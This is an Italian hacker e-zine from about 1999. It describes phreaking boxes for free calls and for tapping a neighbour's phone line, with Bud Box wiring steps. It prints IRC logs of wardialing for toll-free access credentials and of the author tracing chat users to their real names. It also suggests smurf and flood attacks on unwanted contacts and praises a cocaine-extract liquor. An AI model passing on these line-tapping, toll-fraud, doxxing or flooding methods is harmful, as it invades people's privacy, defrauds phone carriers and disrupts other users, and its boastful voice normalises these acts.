Lo scopo di questa box non e' quello di farvi chiamare tutti, anzi vi potranno
chiamare tutti! Senza pagare ovviamente!. Quando la box e' accesa potrete solo
ricevere le chiamate.  Il tuo telefono squillera' normalmente e il  LED
sulla box lampeggiera'. 
Se dopo desideri chiamare basta che spegni la box!

NOTA CHE LA BLACK BOX NON FUNZIONA CON TUTTI
I SISTEMI DI TELEFONIA!

--------Blast Box---------


Questa Box e' stata inventata da Shadow Hawk 1 e non e' una vera e propria
box ma il fine e' lo stesso: scroccare!
La blast box non e' nient'altro che un piccolo amplificatore ,
(intorno ai 5 watt) connesso dove c'e' il microfono del tuo telefono.
Se viene costruita bene e piccola, puo essere inserita all'interno del tel.

Costruzione:

La costruzione non e' veramente importante. Potete farla come volete!

Uso:

Una volta costruita, dovrai solo connettere il microfono all'input
dell'ampificatore.
Quando tu parli nel telefono, dall'altro telefono verranno fuori voci
molto alte.
Sta a voi costruirla e addattarla alle vostre esigenze.


--------Bud Box---------

Questa e' un'unita' portatile. E' un aggeggio utile per chiamate
e per spiare un vicino dalla linea di casa. E' veramente facile da costruire
anche senza preoccuparti.

Materiali richiesti per costruire una Bud Box
========= ========= === ========= === === ===

(2) prese ad alligatore
(1) un pezzo di telefono o (1) un normale telefono
    qualche filo
(1) saldatore
    un po' di stagno

Contruzione della Bud Box
=========== ===== === ====

1)  Taglia il filo che collega il telefono al muro. Dentro dovrebbero esserci
4 fili colorati wires ( vi ricordo che in Italia i fili sono tre: uno rosso
uno verde e uno per la massa). Giallo, rosso, verde, e nero.
Se i fili non sono colrati, non preoccuparti. Sono quei due in mezzo.

2)  Sii certo di tenere circa 50 cm di questo filo connesso al telefono
a meno che non usi gli altri fili. Ora slada una presa ad alligatore
al filo verde e l'altra al rosso
 
Diciamo che la Bud Box non e' nient'altro che la Beige Box cambiata
di nome. Vabbe' cmq io ve l'ho descritta per completezza di informazioni.




##############################################################################

                    :-D :-D :-D :-D :-D :-D :-D :-D :-D

                   Vai avanti tu che a me vien da ridere

                    :-D :-D :-D :-D :-D :-D :-D :-D :-D


Ihih, sapere quanto tempo c'e' voluto per l'uscita di questa e-zine?
Due giorni! Il primo per fare tutti i disegnini, il secondo per
una riveduta generale. E gli articoli??? Beh io ho detto due giorni non due
notti, infatti quelli li ho scritti di notte. Che zombie!
Volete farvi due risate?? Beh, leggetevi i miei log:

La prima volta che ho parlato con zerocool

Session Start: Sun Jan 03 13:19:11 1999
Session Ident: ZeroCool (Bisnuk43e@a-mi44-53.tin.it)
<ZeroCool> ?
<ZeroCool> che numero e'?
<Urkes> purtroppo
<Urkes> 167059059
<Urkes> lo conosci?
<ZeroCool> aspe
<ZeroCool> si
<ZeroCool> ma chiede login
<ZeroCool> passwd
<ZeroCool> e poi una seriale
<Urkes> hmm
<ZeroCool> se li hai ti do' un green sita
<Urkes> non li ho perche l'ho trovato col phonetag
<Urkes> le sto provando tutte
<Urkes> ma nada
<ZeroCool> anche io lo uso
<Urkes> poi ho anche 167375375 o 167365365
<Urkes> che fino a pochi giorni fa mi facevano collegare
<ZeroCool> con che l e p?
<Urkes> cosa
<ZeroCool> non ti chiedeva login e passwd?
<Urkes> si ma non li ho ancora scoperti       <----- iHiHiHiH!
<Urkes> tu quanti ne hai?
Session Close: Sun Jan 03 13:35:46 1999

Ihih, sempre indaffarati con i green ma alla fine non ho trovato nessuno
che mi facesse collegare. Quando si trattava di green mi comportavo molto 
da lamer, visto che desideravo molto non dare piu' $$$ alla telekozz.
Ma dopo tutte quelle persone bustate, ho capito che e' molto rischioso 
usarli; infatti continuo a pagare bollette salate!
Questo e' un op di un canale nella quale dovevo fare un take.

Session Start: Thu Dec 31 18:02:03 1998
Session Ident: ^XXXXXXX^
<^XXXXXXX^> non clonare per favbore
<T0rment0> e dai per dieci cloni stai facendo un casino
Session Close: Thu Dec 31 18:02:11 1998

Questo e' uno alla quale attraverso i vari tools (netstat, tracert ecc.)
sono riuscito a sapere nome e cognome. (prima o poi vi spiego come)

Session Start: Sun Jan 03 15:52:20 1999
Session Ident: XXXXXX (~e@a-ce4-62.tin.it)
<XXXXXX> ciao
<Urkes> ma tu ti chiami Roberto?
<XXXXXX> si come lo sai?
<Urkes> hai 27 anni?
<XXXXXX> no mi spiace ne ho 26
<Urkes> Roberto XX XXXX
<XXXXXX> tu?
<XXXXXX> si ma che ne sai?
<Urkes> eheheh magia
<Urkes> cmq non lo dico a nessuno
<XXXXXX> dai dimmi chi sei
<Urkes> nessuno
<XXXXXX> aheeeee iniziamo!
<XXXXXX> dimmi la tua eta dai
<Urkes> no
<XXXXXX> ci conosciamo?
<Urkes> no
<XXXXXX> e come sai il mio cognome?
<XXXXXX> ti ho fatto uno scherzetto
<XXXXXX> chi sei?
<Urkes> segreto professionale
<XXXXXX> uffa!
<XXXXXX> nome?
<Urkes> eheheh
<XXXXXX> che sai di me?
<Urkes> niente
<XXXXXX> Sai nome e cognome e basta 
<Urkes> si so vederlo attraverso l'email(ihihih)
<XXXXXX> ok e' strano ,ma non voglio accapezzarci il cervello
<XXXXXX> complimenti
<XXXXXX> facciamo una prova....
<XXXXXX> ysalv?
<Urkes> che???
<XXXXXX> trova nome e cognome
<XXXXXX> e una prova
<XXXXXX> :-)
<Urkes> ehi forse non hai capito
<Urkes> mi devi dire il provider
<XXXXXX> ahhhh
<XXXXXX> e lo stesso mio
<Urkes> tin?
<XXXXXX> yes
<Urkes> aspe
<XXXXXX> vai
<Urkes> Allora
<Urkes> nome : Salvatore
<Urkes> cognome: xxxxxxx
<XXXXXX> cazzo, ma come fai???
<Urkes> eheheheh
Session Close: Sun Jan 03 16:03:40 1999

Raga l'altro giorno uno del N.O.P.T. ha cercato di adescarmi ovvero
mi ha prima chiesto se ero un hacker, poi se avevo una foto ,
facendomi credere che lei era una bella ragazza che cercava
caxxi giovani. Mi raccomando quando una vi chiama in query due sono
le possibilita':

1) O e' una che vi sta prendendo per il culo (vero Angelsmil???)
2) O e' una che cerca di adescarvi

Beh, nel primo caso state anche voi al gioco (sempre dati falsi!),
mentre nel secondo caso smurfate, floddate, e fate il possibile
per togliervela di torno. Esempio (veramente capitato!):

<XXXXXX> sei un hack?
<T0rment0> Io? Perche'???
<XXXXXX> Hai una tua foto?
<T0rment0> No, io odio l'hack
<Torment0> Sono un felice sostenitore di Eduardo Freni
<T0rment0> Bel metodo per adescare, bastardo!!!
Connection closed

Bel metodo eh? Ihih, bella anche la scusa del sostenitore! Vi assicuro che e'
tutto vero ed e' capitato un mese fa' mentre mi trovavo su #amoreggiare e
il bastardo, forse accortosi che stavo anche su #hacker.it, mi ha chiamato
in query. Cmq state sempre all'erta e in agguato!

Beh ora basta prendere dal mio repertorio, qualcuno si potrebbe incazzare :)

#############################################################################

          SbrOnZ! SbrOnZ! SbrOnZ!
          !   Cocabuton: yes!   !
          SbrOnZ! SbrOnZ! SbrOnZ!

Raga avete mai sentito parlare del cocabuton???
E' un liquore che e' formato da alcool puro unito all'estratto di cocaina 
(questo fino a una ventina d'anni fa') il quale, forse dopo un'accusa ai 
produttori, oggi viene fatto con un'altra sostanza a posto della cocaina.
Le mie orecchie appena udirono estratto di.... diedero l'impulso al cervello
di dare un bacio a colui che me l'aveva detto, solo che il mio corpo si 
accorse che chi me l'aveva detto era maschio! 
Cmq ho assaggiato quello prodotto nei giorni nostri, e vi posso dire che e'
veramente buono! Secondo il mio parere assomiglia al Drago Verde
(altro liquore ma unito alla marijuana, e non in vendita). 
Allora pensai: " E se mi metto alla ricerca di una bottiglia con il vero 
estratto?" Subito mi armai di amici folli, e di molta benzina (non volevo
incendiare nulla, solo che se non la mettevamo in serbatoio come uscivamo???)
Girai in molti paesi, il quale ognuno aveva molti bar. Moltiplicando il
numero dei bar per il numero dei paesi girati arrivai a visitare
tanti bar che se li avrei contati sarei arrivato ad una cifra con 6 zeri!
Pero' , come si dice da noi, il risultato ne valeva i costi! Infatti alla 
fine trovai un bar in X. XXXXXX (non ve lo dico!), che esteriormente
era molto brutto ma come contenuti...slurp! L'aveva!!! Ci mise davanti ai 
nostri occhi una bottiglia invecchiata di 15 anni, solo che era a meta',
e ne aveva un'altra nascosta che era piena e che avrebbe tenuto per ricordo 
(boh!!!). L'unico problema e' che ci faceva pagare £ 5.000 per ogni bicchiere,
ma a noi il prezzo non interessava molto! In 5 di noi ci finimmo la bottiglia,
ed io mi presi 2 bicchieri :PP Ringraziammo il proprietario (anche lui a noi!)
e gli chiedemmo se era possibile acquistare quella bottiglia che aveva nascosta.
Ci disse che non era fattibile! Allora, tutti 'mbriaghi, ce ne uscimmo!
Quella sera ne combinammo di tutti i colori, ed io parlavo da solo!
In fin dei conti l'avevamo assaggiato, ci eravamo divertiti, ma io non ero
lo stesso contento. Infatti pensavo a quella bottiglia, a come fregarmela,
ma da allora e' rimasto solo un sogno!
Beh non vi rimane che andare in giro anche a voi per assaggiarlo, non rimarrete
delusi! Non mi prendo la responsabilita' delle vostre stronzate !!!
(ihih, neanche delle mie!)

#############################################################################

               $$$$$$$$$$$$$$$$$$$$$$$$$$
               $$$    $$$$$$$$$$$$    $$$
               $$$ $$$$$$$$$$$$$$$ $$$$$$
               $$$    $$ $$  $$ $$   $$$$
               $$$ $$$$$ $$ $ $ $$ $$$$$$
               $$$ $$$$$ $$ $$  $$    $$$
               $$$$$$$$$$$$$$$$$$$$$$$$$$


*DisClAImeR-DisClAImeR-DisClAImeR-DisClAImeR-DisClAImeR-DisClAImeR-DisClAImeR*

Tutte le informazioni contenute in questa e-zine sono solo per puro scopo 
informativo e non dovranno essere usate per altri usi! Se verranno usate
per altri scopi, al di fuori di quello educativo, IO, T0rment0, non sono
responsabile dei danni che vi causeranno, sia legali che materiali.
Se vuoi usare queste informazioni per causare distruzione o azioni illegali,
e' un TUO PROBLEMA! ed io non sono responsabile dei danni incorsi!

*DisClAImeR-DisClAImeR-DisClAImeR-DisClAImeR-DisClAImeR-DisClAImeR-DisClAImeR*

0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0_0 SALUTI =_=_=_=_=_=_=_=_=_=_=_=_=_=_=_=	

Saluto tutti quelli che mi conoscono......

Si, vabbe!

Saluto:

TechnoKnight - per il supporto morale
S4mron - perche' e' uno ok!
N0body88 - perche' sta trascorrendo un brutto momento
Lived - Perche' mi rende allegro
Angelcry - perche' e' l'unica ragazza seria che conosco
Bissio - per avermi fatto credere che mi aiutava
CB4 - perche' e' ultramegaindaffarato con l'esame
I Bot - perche' mi fanno molta compagnia e poi organizzano sempre dei party...
NetMaster - perche' e' un amicone
Me stesso - perche' sono l'unica persona su cui contare

Fanculo:

Tutti i lamer: che non sono quelli che mi chiedono in query "Sai dove posso 
trovare una guida sull'hacking?" o "Mi sai consigliare qual'e' la miglior 
distribuzione di Linux?", ma quelli che mi chiedono "Per favore i programmi
puoi darmeli gia' compilati" ma cazzo! c'e' il cc per quello, oppure
"Se mi dai una shell ti do un green" o "Se mi dai un green ti do una shell"
o "Scambi shell o green?". Ma che cazz! Io hackero una shell per una 
soddisfazione personale non per darle agli altri che ci piazzano su
bot eggdrop o i loro DoS preferiti. E poi alla parola green io sostituisco
la parola "Fottersiconlepropriemani!"

Tutte le persone che su Irc ti giudicano un grande hacker solo perche'
gli fai vedere come avviene uno split (bomba al router rulez!) o che
piazzi su un canale 200 bot tutti collegati. 

Tutti quei siti di hacking che stanno nascendo, autoproclamandosi 
"Grandi hacker", e poi in realta' usano tutti Win e Linux lo conoscono
per sentito dire! Che dicono di aver programmato in HTML la loro pag
e di scoprire che oltre ad aver levato la stringa 
"Microsoft Frontpage 3.0", hanno dimenticato "Microsoft Theme" un po'
piu' sotto :(

A tutti quelli che si installano Linux solo per far vedere agli altri 
che ce l'hanno!


=_0_=_0_=_0_=_0_=_0_=_0_=_0_=_0_=_0_=_0_=_0_=_0_=_0_=_0_=_0_=_0_=_0_=_0_=


Ok, gente il primo numero e' finito, per qualsiasi domanda, informazione,
critiche, suggerimenti o collaborazione, e-mailate a questo indirizzo:
xj@boozed.tox . Bye!!!
